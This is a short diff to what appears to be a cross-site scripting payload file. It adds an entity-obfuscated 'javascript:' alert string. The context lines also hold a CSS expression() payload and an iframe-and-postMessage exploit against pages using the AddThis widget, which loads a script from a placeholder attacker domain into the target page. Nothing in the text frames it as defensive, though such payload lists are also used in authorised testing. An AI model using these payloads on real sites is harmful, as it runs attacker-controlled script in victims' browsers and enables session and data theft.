@@ -1,4 +1,5 @@
 <b style="x: expression(alert(1))">
+javasc&#114;ipt:alert(0)
 <iframe id="frame" src="https://targetpage/using_addthis"></iframe>
 <script>
 document.getElementById("frame").postMessage('at-share-bookmarklet://ATTACKERDOMAIN/xss.js', '*');
